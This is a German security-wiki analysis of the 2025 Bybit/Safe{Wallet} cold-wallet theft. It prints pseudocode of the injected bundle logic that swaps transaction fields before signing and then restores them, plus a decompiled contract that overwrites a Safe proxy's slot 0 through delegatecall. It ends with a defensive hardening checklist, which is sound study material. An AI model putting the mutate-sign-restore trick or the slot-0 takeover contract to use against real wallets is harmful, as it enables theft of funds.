# Kompromittierung des Web3-Signing-Workflows und Übernahme eines Safe Delegatecall Proxy

{{#include ../../banners/hacktricks-training.md}}

## Überblick

Eine cold-wallet theft chain kombinierte eine **supply-chain compromise der Safe{Wallet}-Weboberfläche** mit einem **on-chain delegatecall primitive, das den implementation pointer eines Proxys (slot 0) überschreibt**. Die wichtigsten Erkenntnisse sind:

- Wenn ein dApp Code in den Signing-Pfad einschleusen kann, kann es einen Signer dazu bringen, eine gültige **EIP-712-Signatur über vom Angreifer gewählte Felder** zu erzeugen, während die ursprünglichen UI-Daten wiederhergestellt werden, sodass andere Signer nichts davon bemerken.
- Safe-Proxys speichern `masterCopy` (implementation) in **storage slot 0**. Ein delegatecall an einen Contract, der in slot 0 schreibt, „upgradet“ den Safe effektiv auf die Logik des Angreifers und verschafft diesem vollständige Kontrolle über die Wallet.

## Off-chain: Gezielte Signing-Mutation in Safe{Wallet}

Ein manipuliertes Safe-Bundle (`_app-*.js`) griff gezielt bestimmte Safe- und Signer-Adressen an. Die injizierte Logik wurde unmittelbar vor dem Signing-Aufruf ausgeführt:<sup>[[1]](#references)[[3]](#references)</sup>
```javascript
// Pseudocode of the malicious flow
orig = structuredClone(tx.data);
if (isVictimSafe && isVictimSigner && tx.data.operation === 0) {
tx.data.to = attackerContract;
tx.data.data = "0xa9059cbb...";      // ERC-20 transfer selector
tx.data.operation = 1;                 // delegatecall
tx.data.value = 0;
tx.data.safeTxGas = 45746;
const sig = await sdk.signTransaction(tx, safeVersion);
sig.data = orig;                       // restore original before submission
tx.data = orig;
return sig;
}
```
### Angriffseigenschaften
- **Kontextgesteuert**: Hart codierte Allowlists für die Safe-/Signer der Opfer verhinderten Rauschen und senkten die Erkennung.<sup>[[1]](#references)[[3]](#references)</sup>
- **Mutation im letzten Moment**: Die Felder (`to`, `data`, `operation`, Gas) wurden unmittelbar vor `signTransaction` überschrieben und anschließend zurückgesetzt, sodass Proposal-Payloads in der UI harmlos aussahen, während die Signaturen mit der Payload des Angreifers übereinstimmten.
- **EIP-712-Intransparenz**: Wallets zeigten strukturierte Daten an, dekodierten jedoch keine verschachtelten Calldata und wiesen nicht auf `operation = delegatecall` hin, wodurch die mutierte Nachricht effektiv blind signiert wurde.

### Relevanz der Gateway-Validierung
Safe-Proposals werden an das **Safe Client Gateway** übermittelt. Vor den gehärteten Prüfungen konnte das Gateway eine Proposal akzeptieren, bei der `safeTxHash`/Signatur anderen Feldern entsprachen als dem JSON-Body, wenn die UI diese nach dem Signieren neu schrieb. Nach dem Vorfall weist das Gateway nun Proposals zurück, deren Hash/Signatur nicht mit der übermittelten Transaktion übereinstimmen. Eine vergleichbare serverseitige Hash-Verifizierung sollte für jede Signing-Orchestration-API durchgesetzt werden.

### Höhepunkte des Bybit/Safe-Vorfalls von 2025
- Der Drain der Bybit-Cold-Wallet vom 21. Februar 2025 (~401.000 ETH) verwendete dasselbe Muster: Ein kompromittiertes Safe-S3-Bundle wurde nur für Bybit-Signer ausgelöst und änderte `operation=0` → `1`, wobei `to` auf einen vorab bereitgestellten Angreifer-Contract zeigte, der Slot 0 beschrieb.<sup>[[1]](#references)[[3]](#references)</sup>
- Der aus dem Wayback-Cache stammende `_app-52c9031bfa03da47.js` zeigt, dass die Logik anhand von Bybits Safe (`0x1db9…cf4`) und Signer-Adressen aktiviert wurde und anschließend zwei Minuten nach der Ausführung sofort auf ein unverändertes Bundle zurückgesetzt wurde, entsprechend dem Trick „mutieren → signieren → wiederherstellen“.<sup>[[1]](#references)[[2]](#references)</sup>
- Der bösartige Contract (z. B. `0x9622…c7242`) enthielt einfache Funktionen `sweepETH/sweepERC20` sowie ein `transfer(address,uint256)`, das den Implementation-Slot beschrieb. Die Ausführung von `execTransaction(..., operation=1, to=contract, data=transfer(newImpl,0))` änderte die Proxy-Implementierung und gewährte vollständige Kontrolle.<sup>[[1]](#references)[[3]](#references)</sup>

## On-chain: Delegatecall-Proxy-Takeover durch Slot-Kollision

Safe-Proxies speichern `masterCopy` in **Storage-Slot 0** und delegieren die gesamte Logik dorthin. Da Safe **`operation = 1` (delegatecall)** unterstützt, kann jede signierte Transaktion auf einen beliebigen Contract zeigen und dessen Code im Storage-Kontext des Proxys ausführen.<sup>[[3]](#references)</sup>

Ein Angreifer-Contract ahmte ein ERC-20-`transfer(address,uint256)` nach, schrieb jedoch stattdessen `_to` in Slot 0:<sup>[[1]](#references)[[3]](#references)</sup>
```solidity
// Decompiler view (storage slot 0 write)
uint256 stor0; // slot 0
function transfer(address _to, uint256 _value) external {
stor0 = uint256(uint160(_to));
}
```
Ausführungspfad:<sup>[[1]](#references)[[3]](#references)</sup>
1. Victims sign `execTransaction` with `operation = delegatecall`, `to = attackerContract`, `data = transfer(newImpl, 0)`.
2. Safe masterCopy validates signatures over these parameters.
3. Proxy delegatecalls into `attackerContract`; the `transfer` body schreibt slot 0.
4. Slot 0 (`masterCopy`) zeigt nun auf attacker-controlled logic → **full wallet takeover und fund drain**.

### Guard- und Versionshinweise (post-incident hardening)
- Safes >= v1.3.0 können einen **Guard** installieren, um `delegatecall` abzulehnen oder ACLs für `to`/Selectoren durchzusetzen; Bybit lief mit v1.1.1, daher war kein Guard hook vorhanden. Das Upgraden der Contracts (und das erneute Hinzufügen der Owners) ist erforderlich, um diese control plane zu erhalten.

## Detection- und hardening-checklist

- **UI integrity**: JS assets / SRI pinnen; Bundle-Diffs überwachen; die Signing UI als Teil der trust boundary behandeln.
- **Sign-time validation**: Hardware wallets mit **EIP-712 clear-signing**; `operation` explizit darstellen und verschachtelte Calldata decodieren. Das Signieren ablehnen, wenn `operation = 1`, sofern die Policy dies nicht erlaubt.
- **Server-side hash checks**: Gateways/Services, die Proposals relayen, müssen `safeTxHash` neu berechnen und validieren, dass die Signatures mit den übermittelten Feldern übereinstimmen.
- **Policies/Allowlists**: Preflight-Regeln für `to`, Selectoren und Asset-Typen; `delegatecall` außer bei geprüften Flows untersagen. Vor dem Broadcasting vollständig signierter Transactions einen internen Policy-Service voraussetzen.
- **Contract design**: Das Offenlegen eines beliebigen `delegatecall` in Multisig-/Treasury-Wallets vermeiden, sofern es nicht unbedingt erforderlich ist. Upgrade-Pointer außerhalb von slot 0 platzieren oder mit expliziter Upgrade-Logik und Access Control absichern.
- **Monitoring**: Bei `delegatecall`-Executions aus Wallets, die Treasury-Funds halten, sowie bei Proposals, die `operation` aus typischen `call`-Patterns ändern, einen Alert auslösen.

## References

- [1] [Forensische Analyse des Bybit-Safe-Exploits von AnChain.AI](https://www.anchain.ai/blog/bybit)
- [2] [Analyse des Safe-Bundle-Compromises von Zero Hour Technology](https://www.panewslab.com/en/articles/7r34t0qk9a15)
- [3] [Detaillierte technische Analyse des Bybit-Hacks (NCC Group)](https://www.nccgroup.com/research-blog/in-depth-technical-analysis-of-the-bybit-hack/)
- [4] [EIP-712](https://eips.ethereum.org/EIPS/eip-712)
- [5] [safe-client-gateway (GitHub)](https://github.com/safe-global/safe-client-gateway)

{{#include ../../banners/hacktricks-training.md}}
